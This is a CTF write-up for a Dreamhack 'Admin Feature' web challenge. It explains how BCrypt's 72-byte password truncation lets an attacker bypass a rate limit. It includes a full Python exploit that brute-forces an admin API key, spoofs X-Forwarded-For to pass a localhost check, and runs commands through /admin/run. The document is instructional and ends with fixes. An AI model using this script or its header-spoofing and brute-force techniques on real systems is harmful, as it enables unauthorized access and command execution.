# 👨‍💼 Admin Feature

## Description

This is an admin feature.

## Initial Analysis

The application presents an admin interface with the following key components:
- User registration/login system
- Admin search functionality with rate limiting
- Command execution feature requiring admin privileges
- Security restrictions allowing admin access only from localhost (127.0.0.1)

## Vulnerability Analysis

### CVE-2025-22228: BCrypt 72-byte Truncation

The core vulnerability lies in BCryptPasswordEncoder's implementation which only considers the first 72 bytes of a password for hashing and verification. This means:

```kotlin
passwordEncoder.matches("password72chars" + "anything", hash) // Returns true
```

If a user registers with a password longer than 72 characters, any password sharing the same first 72 characters will successfully authenticate.

### Code Analysis

**Critical Security Flaw in AdminService.kt:**
```kotlin
// Rate limiting uses full password for key generation
val redisKey = "searchLimit:$sessionUsername:${sha256(password)}"

// But password verification only uses first 72 bytes
if (!passwordEncoder.matches(password, user.password)) {
    throw AdminServiceException(HttpStatus.UNAUTHORIZED, "Password does not match.")
}
```

This creates a bypass mechanism:
1. Register with 72-character password
2. Use different suffixes to generate unique rate limiting keys
3. All variations pass authentication due to BCrypt truncation
4. Each variation gets separate rate limit counters

## Exploitation Strategy

### Phase 1: Account Setup
Create account with exactly 72 characters to maximize control:
```python
PASSWORD_72_CHARS = "a" * 72
register_and_login(session, "exploit72", PASSWORD_72_CHARS)
```

### Phase 2: Rate Limit Bypass + API Key Brute Force
The application searches API keys by suffix using `findByApiKeyEndingWith()`. Combined with rate limit bypass:

```python
def search_api_key_char(session, base_password, attempt_num, test_char, current_key=""):
    search_data = {
        "password": base_password + str(attempt_num),  # Unique rate limit key
        "apiKey": test_char + current_key             # Build key from right to left
    }
```

### Phase 3: Command Execution
With admin API key, execute commands through `/admin/run` endpoint:
```python
headers = {
    "X-Forwarded-For": "127.0.0.1",  # Bypass localhost restriction
    "X-Api-Key": discovered_api_key
}
```

## Exploit Implementation

```python
import requests
import time
from string import hexdigits

HOST = "host8.dreamhack.games"
PORT = "19208"
BASE_URL = f"http://{HOST}:{PORT}"

# BCrypt 72-byte limit exploitation
PASSWORD_72_CHARS = "a" * 72

def register_and_login(session, username, password):
    """Register and login with 72-char password"""
    # Registration
    register_data = {"username": username, "password": password}
    response = session.post(f"{BASE_URL}/user/register", json=register_data)
    
    # Login
    login_data = {"username": username, "password": password}
    response = session.post(f"{BASE_URL}/user/login", json=login_data)
    
    return response.status_code == 200

def bruteforce_api_key(session, base_password):
    """Brute force API key using rate limit bypass"""
    hex_chars = hexdigits[:-6].lower()  # 0-9, a-f
    found_key = ""
    attempt = 0
    
    for position in range(64):  # API keys are 64 characters
        for char in hex_chars:
            attempt += 1
            
            search_data = {
                "password": base_password + str(attempt),  # Rate limit bypass
                "apiKey": char + found_key
            }
            
            headers = {"X-Forwarded-For": "127.0.0.1"}
            
            response = session.post(f"{BASE_URL}/admin/search", 
                                  json=search_data, headers=headers)
            
            if response.status_code == 200 and response.json().get("message") == "ADMIN":
                found_key = char + found_key
                print(f"[+] Found char at position {position + 1}: {char}")
                break
                
            time.sleep(0.1)
        
        if len(found_key) == 64:
            break
    
    return found_key

def execute_command(session, api_key, command="cat /flag"):
    """Execute system command"""
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Api-Key": api_key
    }
    
    response = session.post(f"{BASE_URL}/admin/run", 
                           params={"cmd": command}, headers=headers)
    
    if response.status_code == 200:
        return response.json().get("message", "")
    return None

def main():
    session = requests.Session()
    
    # Step 1: Create account with 72-char password
    if not register_and_login(session, "exploit72", PASSWORD_72_CHARS):
        print("[-] Login failed")
        return
    
    # Step 2: Brute force API key with rate limit bypass
    api_key = bruteforce_api_key(session, PASSWORD_72_CHARS)
    
    if not api_key:
        print("[-] API key not found")
        return
    
    # Step 3: Execute command to get flag
    flag = execute_command(session, api_key, "cat /flag")
    
    if flag:
        print(f"🚩 Flag: {flag.strip()}")
    else:
        print("[-] Flag retrieval failed")

if __name__ == "__main__":
    main()
```

## Key Takeaways

### Technical Insights
1. **BCrypt Implementation Flaw**: Always verify BCrypt library behavior regarding input length limits
2. **Rate Limiting Bypass**: Inconsistent key generation between rate limiting and authentication can create bypass opportunities
3. **API Security**: Suffix-based searches can be vulnerable to brute force attacks

### Security Recommendations
1. Implement proper input validation for password length
2. Use consistent data for both rate limiting and authentication
3. Consider prefix-based or full-match API key searches instead of suffix matching
4. Implement additional entropy in rate limiting keys beyond user-controlled input

### CTF Strategy
- When encountering recent challenges, research current CVEs related to the technology stack
- Analyze authentication and rate limiting logic for inconsistencies
- Look for opportunities where user-controlled input affects security boundaries differently in multiple code paths
